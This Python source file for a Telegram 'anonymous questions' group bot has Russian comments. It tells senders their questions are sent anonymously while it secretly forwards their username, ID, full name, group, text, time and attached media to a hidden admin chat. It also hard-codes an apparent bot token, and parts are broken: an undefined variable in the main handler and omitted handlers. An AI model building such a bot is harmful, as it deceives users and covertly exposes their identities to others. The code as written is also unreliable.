import telebot
from telebot import types
import uuid
import sqlite3
from collections import defaultdict

# Настройки
TOKEN = '8430859086:AAEsdPIGXI-xG-6COFj48AUnU69yseZOnZo'  # Токен
ADMIN_ID = 1135333763  # Ваш ID для приваток
ADMIN_CHAT_ID = -1003267199569  # ID админской беседы (узнать /getid в группе или @userinfobot)

bot = telebot.TeleBot(TOKEN)

# База
conn = sqlite3.connect('anon_bot.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS anon_sessions 
                  (group_id INTEGER, target_username TEXT, sender_id INTEGER, question_id TEXT)''')
conn.commit()

pending_questions = defaultdict(dict)  # group_id: {q_id: sender_id}

@bot.message_handler(content_types=['new_chat_members'])
def on_bot_added(message):
    bot_username = bot.get_me().username
    for member in message.new_chat_members:
        if member.username == bot_username:
            bot.reply_to(message, "/anon @username — запуск анонимных вопросов.")

@bot.message_handler(commands=['anon'])
def anon_start(message):
    if message.chat.type in ['group', 'supergroup']:
        args = message.text.split()
        if len(args) > 1 and args[1].startswith('@'):
            target_username = args[1]
            question_id = str(uuid.uuid4())
            markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            markup.add(types.KeyboardButton("❓ Анонимный вопрос"))
            bot.reply_to(message, f"Анонимные вопросы для {target_username}. Нажмите кнопку ниже.", reply_markup=markup)
            cursor.execute("INSERT INTO anon_sessions (group_id, target_username, question_id) VALUES (?, ?, ?)",
                           (message.chat.id, target_username, question_id))
            conn.commit()
            pending_questions[message.chat.id][question_id] = None
        else:
            bot.reply_to(message, "Формат: /anon @username")

@bot.message_handler(func=lambda m: "Анонимный вопрос" in m.text)
def receive_anon_question(message):
    cursor.execute("SELECT group_id, target_username, question_id FROM anon_sessions WHERE group_id=? ORDER BY rowid DESC LIMIT 1", (message.chat.id,))
    result = cursor.fetchone()
    if result:
        group_id, target_username, question_id = result
        sender_id = message.from_user.id
        sender_username = message.from_user.username or "no_username"
        sender_first_name = message.from_user.first_name or ""
        sender_last_name = message.from_user.last_name or ""
        
        cursor.execute("UPDATE anon_sessions SET sender_id=? WHERE question_id=?", (sender_id, question_id))
        conn.commit()
        pending_questions[group_id][question_id] = sender_id
        
        # АНОНИМНО в группу: только вопрос
        anon_text = f"❓ Анонимный вопрос {target_username}:\n{m.message.text}"
        markup_group = types.InlineKeyboardMarkup()
        markup_group.add(types.InlineKeyboardButton("💬 Ответить", callback_data=f"reply_g_{question_id}"))
        bot.send_message(group_id, anon_text, reply_markup=markup_group, parse_mode='Markdown')
        
        # ПОЛНАЯ ИНФО скрыто в админ чат
        full_info = f"""🕵️‍♂️ ПОЛНАЯ ИНФО
Вопрос от: @{sender_username} ({sender_id})
Имя: {sender_first_name} {sender_last_name}
Группа: {group_id}
Кому: {target_username}
Вопрос: {message.text}
Время: {message.date}"""
        
        if message.content_type == 'photo':
            bot.send_photo(ADMIN_CHAT_ID, message.photo[-1].file_id, caption=full_info)
        elif message.content_type == 'voice':
            bot.send_voice(ADMIN_CHAT_ID, message.voice.file_id, caption=full_info)
        elif message.content_type == 'video':
            bot.send_video(ADMIN_CHAT_ID, message.video.file_id, caption=full_info)
        else:
            bot.send_message(ADMIN_CHAT_ID, full_info, parse_mode='Markdown')
        
        # Подтверждение отправителю (анонимно)
        markup = types.ReplyKeyboardRemove()
        bot.reply_to(message, "✅ Вопрос отправлен анонимно!", reply_markup=markup)
    else:
        bot.reply_to(message, "Сначала запустите /anon @username")

@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_g_'))
def reply_callback(call):
    question_id = call.data.split('_')[2]
    group_id = call.message.chat.id
    bot.answer_callback_query(call.id)
    bot.send_message(group_id, "💬 Напишите ответ:", reply_markup=types.ReplyKeyboardRemove())
    bot.register_next_step_handler(call.message, lambda m: send_group_reply(m, question_id, group_id))

def send_group_reply(message, question_id, group_id):
    sender_id = pending_questions[group_id].get(question_id)
    if sender_id:
        bot.send_message(sender_id, f"💬 Ответ на ваш вопрос:\n{message.text}")
        bot.send_message(group_id, "✅ Ответ отправлен анонимно!", reply_markup=types.InlineKeyboardMarkup())
    bot.delete_message(group_id, message.message_id)  # Удаляем ответ из истории

# Приватные ссылки (из предыдущей версии)
@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id == ADMIN_ID:
        bot.reply_to(message, "Бот готов!")
    else:
        link = str(uuid.uuid4())
        cursor.execute("CREATE TABLE IF NOT EXISTS sessions (link TEXT PRIMARY KEY, owner_id INTEGER)")
        cursor.execute("INSERT OR REPLACE INTO sessions VALUES (?, ?)", (link, message.chat.id))
        conn.commit()
        bot.reply_to(message, f"https://t.me/{bot.get_me().username}?start={link}")

# Остальные хендлеры приваток аналогично предыдущему коду...

if __name__ == '__main__':
    bot.polling(none_stop=True)
